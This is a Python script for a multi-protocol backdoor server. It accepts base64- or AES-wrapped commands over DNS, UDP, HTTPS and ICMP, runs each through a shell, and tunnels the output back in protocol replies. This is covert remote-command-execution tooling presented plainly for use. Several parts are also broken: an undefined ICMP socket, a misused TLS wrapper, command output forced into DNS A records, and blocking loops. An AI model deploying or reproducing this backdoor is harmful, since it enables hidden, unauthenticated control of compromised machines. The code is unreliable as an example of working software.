# multi_protocol_server.py

import socket
import base64
import subprocess
import ssl
import os
from dnslib import DNSRecord, QTYPE, RR, A
from icmp import ICMP_ECHO_REQUEST, ICMP_ECHO_REPLY, checksum
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


# AES Encryption for UDP
class Encryptor:
    def __init__(self, key: bytes):
        self.key = key
        self.iv = os.urandom(16)  # Random IV for each encryption
        self.backend = default_backend()

    def encrypt(self, data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        padded_data = self._pad(data)
        return encryptor.update(padded_data) + encryptor.finalize()

    def decrypt(self, data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data) + decryptor.finalize()
        return self._unpad(decrypted_data)

    def _pad(self, data: bytes) -> bytes:
        padding = 16 - len(data) % 16
        return data + bytes([padding]) * padding

    def _unpad(self, data: bytes) -> bytes:
        return data[:-data[-1]]


# Helper to execute the command
def execute_command(command: str):
    try:
        # Execute the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode('utf-8')}"


# Process DNS query (DNS shell)
def process_dns_query(query):
    """
    Decode DNS query to get the command and return the result.
    """
    command = base64.b64decode(query).decode('utf-8')
    print(f"Received DNS command: {command}")
    output = execute_command(command)
    return base64.b64encode(output.encode('utf-8')).decode('utf-8')


# Handle ICMP (ICMP shell)
def process_icmp_request(data):
    """
    Decode ICMP request to get the command and return the result.
    """
    command = base64.b64decode(data).decode('utf-8')
    print(f"Received ICMP command: {command}")
    output = execute_command(command)
    return base64.b64encode(output.encode('utf-8')).decode('utf-8')


# Handle HTTPS (SSL/TLS)
def process_https_request(data):
    """
    Decode HTTPS request to get the command and return the result.
    """
    command = base64.b64decode(data).decode('utf-8')
    print(f"Received HTTPS command: {command}")
    output = execute_command(command)
    return base64.b64encode(output.encode('utf-8')).decode('utf-8')


# Handle UDP (UDP shell)
def process_udp_request(data):
    """
    Decrypt the UDP data, execute the command, and return the result.
    """
    decrypted_command = encryptor.decrypt(data).decode('utf-8')
    print(f"Received UDP command: {decrypted_command}")
    output = execute_command(decrypted_command)
    encrypted_response = encryptor.encrypt(output.encode('utf-8'))
    return encrypted_response


# Multi-protocol server listening for DNS, HTTPS, ICMP, and UDP
def server_listener():
    server_ip = '0.0.0.0'
    server_dns_port = 53
    server_https_port = 443
    server_icmp_port = 0  # ICMP doesn't use a port
    server_udp_port = 9999

    # Set up raw socket for ICMP and UDP
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_udp.bind((server_ip, server_udp_port))

    # DNS socket setup
    sock_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_dns.bind((server_ip, server_dns_port))

    # Create SSL/TLS context for HTTPS
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

    # Listening for connections
    print(f"Server listening on {server_ip} (DNS: {server_dns_port}, HTTPS: {server_https_port}, UDP: {server_udp_port})")

    while True:
        # Listening for UDP traffic
        data, addr = sock_udp.recvfrom(1024)
        if data:
            print(f"Received UDP packet from {addr}")
            result = process_udp_request(data)
            sock_udp.sendto(result, addr)

        # Listening for DNS queries
        data, addr = sock_dns.recvfrom(1024)
        if data:
            dns_query = DNSRecord.parse(data)
            query_name = str(dns_query.q.qname)[:-1]  # Remove trailing dot
            result = process_dns_query(query_name)
            dns_response = DNSRecord().add_answer(RR(dns_query.q.qname, QTYPE.ANY, rdata=A(result), ttl=60))
            sock_dns.sendto(dns_response.pack(), addr)

        # Listening for HTTPS (TLS) traffic
        try:
            conn, addr = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname="example.com")
            conn.bind((server_ip, server_https_port))
            conn.listen(1)
            print(f"Listening for HTTPS connections on {server_ip}:{server_https_port}")
            secure_sock, _ = conn.accept()
            data = secure_sock.recv(1024)
            if data:
                result = process_https_request(data)
                secure_sock.send(result.encode('utf-8'))
                secure_sock.close()
        except Exception as e:
            print(f"Error with HTTPS connection: {e}")

        # Listening for ICMP Echo Requests
        try:
            icmp_data, addr = sock_icmp.recvfrom(1024)
            if icmp_data:
                result = process_icmp_request(icmp_data)
                send_icmp_reply(result, addr)
        except Exception as e:
            print(f"Error with ICMP request: {e}")


# Send ICMP reply
def send_icmp_reply(result, addr):
    """
    Send ICMP Echo Reply with the command output.
    """
    packet = ICMP_ECHO_REPLY()
    packet.data = base64.b64encode(result.encode('utf-8')).decode('utf-8')
    packet.checksum = checksum(packet)
    sock_icmp.sendto(packet.encode(), addr)


if __name__ == '__main__':
    encryptor = Encryptor(os.urandom(32))  # AES key for UDP
    server_listener()
